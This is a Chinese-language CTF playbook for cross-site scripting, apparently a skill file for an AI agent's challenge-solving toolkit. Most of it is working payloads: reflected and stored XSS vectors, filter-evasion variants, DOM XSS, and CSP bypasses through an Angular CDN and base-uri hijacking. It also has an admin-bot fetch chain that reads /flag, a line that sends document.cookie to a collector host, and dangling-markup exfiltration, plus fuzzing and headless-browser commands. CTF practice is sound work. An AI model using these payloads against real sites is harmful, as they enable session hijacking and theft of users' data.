---
name: ctf-web-xss
description: CTF XSS 跨站脚本 攻击 playbook。识别/触发词：XSS/跨站脚本/<script>alert/DOM XSS/反射/存储/CSP绕过/cookie窃取/反射型HTML注入/XSS filter escape/innerHTML/sink/source/angularVue模板注入。碰到这些指纹时由二级 ctf-web 路由表调用本 leaf，专项解决"这个考点怎么打"。
---

# CTF XSS 跨站脚本 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"这个考点怎么打"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。**CTF 靶机常不出网** → 优先本地回显（页面回显、admin bot 回访日志、report 机制读 cookie/flag 页面）；OOB 回连 attacker.com/DNS exfil 在 CTF 多用不上。

## 识别特征（什么时候调我）
- 参数原样回显在 HTML 中（无转义），输入 `<u>` 后页面出现下划线标签 → 反射型 HTML 注入。
- 输入框/留言/个人资料提交后内容持久化，再访问页面触发 → 存储型 XSS。
- 页面有 admin bot / "report to admin" / puppeteer headless 提示 → 典型 XSS 利用链：让 bot 访问你投毒的页面，bot 带 cookie 访问 `/flag` 或执行你注入的 JS。
- 响应头里 `Content-Security-Policy` 限制 script-src → 需要 CSP 绕过（unsafe-inline/CDN/jsonp/nonce 泄露/base-uri/dangling-markup）。
- 前端 JS 把 `location.hash`/`location.search`/`document.referrer`/`postMessage` 直接喂给 `innerHTML`/`eval`/`document.write`/`setTimeout`/`new Function` → DOM XSS，看源码找 sink-source 链。
- 框架指纹：Angular `{{7*7}}` → 模板注入（SSTI/XSS 混合）；Vue `{{constructor.constructor('alert(1)')()}}`；React 默认转义需 `dangerouslySetInnerHTML`。
- cookie 中带 `flag=` 或 hint 提示 "admin only" → 多为窃取 admin cookie 或让 admin bot 代读。

## 核心攻击手法

### 0. 先探：确认回显点与过滤
```
# 依次测三态，看哪个回显/被吞
xsstest              # 原样回显?
<b>xsstest</b>       # 标签解析?
<img src=x>          # 标签被过滤?
"'><img src=x onerror=alert(1)>
```
判断：HTML 实体化（`&lt;`）→ 已转义；标签消失 → WAF/黑名单过滤；原样出现 → 反射点。

### 1. 反射型 / 存储型 通用 payload
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input onfocus=alert(1) autofocus>
```

### 2. 黑名单/过滤绕过
```
大小写:  <ScRiPt>alert(1)</ScRiPt>
空格混淆:<svg/onload=alert(1)>
编码:    <img src=x onerror=&#97;lert(1)>
         javascript:alert(1)   (URL context, <a href=>)
括号缺:  <svg onload=alert\x601\x60>
关键字拆:onclick=eval('ale'+'rt(1)')
```

### 3. DOM XSS（纯前端，看源码找 sink）
```
# 经典 sink: location.hash -> innerHTML
http://target/#<img src=x onerror=alert(1)>

# 常见 sink: eval / setTimeout / Function / document.write / innerHTML / outerHTML
# 常见 source: location.hash/search, document.referrer, postMessage.data
```

### 4. CSP 绕过（看 CSP 头选打法）
```
script-src 'unsafe-inline'   -> 直接 <script>
script-src cdn.jsdelivr.net  -> 引用该 CDN 上的 angular 通用 payload:
<script src=//cdn.jsdelivr.net/npm/angular@1.4.7/angular.min.js></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
script-src 'self' + jsonp端点 -> JSONP endpoint callback 注入
base-uri 未限制              -> <base href="https://evil/"> 劫持相对脚本
nonce 泄露在 URL/报错         -> 复用 nonce
report-uri                  -> 借 CSP 报告做带外（CTF 常不出网，慎用）
```

### 5. Admin Bot 利用链（最常见 CTF 形态）
```
# 1. 自己起一个接收端（本机/平台内），但 CTF 常不出网 → 改用页面回显到 report 机制
# 2. 注入让 bot 在自己上下文里取 flag 再回投到你能看的地方:
<script>
 fetch('/flag').then(r=>r.text()).then(f=>{
   // 回投：写入留言板/个人简介/某个 GET 参数，你能看到
   fetch('/profile?bio='+encodeURIComponent(f));
 });
</script>
# 3. 提交该 URL 给 admin bot(report 接口)
```

### 6. Cookie 窃取（仅当可出网或有落地点时）
```
<img src=x onerror="location='https://your.collector/?c='+document.cookie">
# CTF: 通常 document.cookie 里没 flag，flag 在 /flag 或 admin 私密页 → 用上面的 fetch 链
```

### 7. Dangling Markup（CSP 严但可读 flag 页面时）
```
<img src="https://your/
# 后续 HTML（含 flag）被当成 img URL 片段带出（需可出网，CTF 慎用）
```

## CTF 实战结晶
（待积累，下次遇到本题型回填此处：题名 + trick + payload + 链路）

## 工具命令
```
# 快速 fuzz 反射点
curl -s "http://target/?q=xsstest" | grep -i xsstest

# payload 字典（小、定向，CTF 靶机轻量别高并发）
ffuf -u 'http://target/?q=FUZZ' -w /usr/share/seclists/Fuzzing/XSS/XSS.txt -t 5

# 起 JS 接收端（本地，仅可出网时）
python3 -m http.server 8000

# headless 复现 admin bot 行为（本地验证用自定义数据，别用默认值当真）
python3 -c "
from pyppeteer import launch
import asyncio
async def main():
    b=await launch(headless=True); p=await b.newPage()
    await p.goto('http://target/?q=<svg onload=alert(1)>'); await p.screenshot({'path':'x.png'})
    await b.close()
asyncio.get_event_loop().run_until_complete(main())
"
```

## 深度参考（穷尽技巧时加载）
- hack-skills-main/skills/xss-cross-site-scripting/SKILL.md
- PortSwigger XSS cheatsheet（按 sink/context 速查 payload）
-PayloadBox / WordPress XSS payload 列表

## 关联 leaf
- `ctf-web-sqli` — XSS 参数点常同时是注入点（留言/搜索框）
- `ctf-web-ssrf` — admin bot 访问的内部 URL 链（report 接口常连 SSRF）
- `ctf-web-deser` — bot 上下文或后端反序列化链
- `ctf-web-ssti` — Angular/Vue 模板注入与 XSS 同形，区分路由
- 客户端原型污染（prototype pollution）→ 触发 sink 是 DOM XSS 高频兄弟手法；深度参考 hack-skills-main/skills/prototype-pollution-advanced/SKILL.md（本树暂未单列 prototype-pollution leaf）
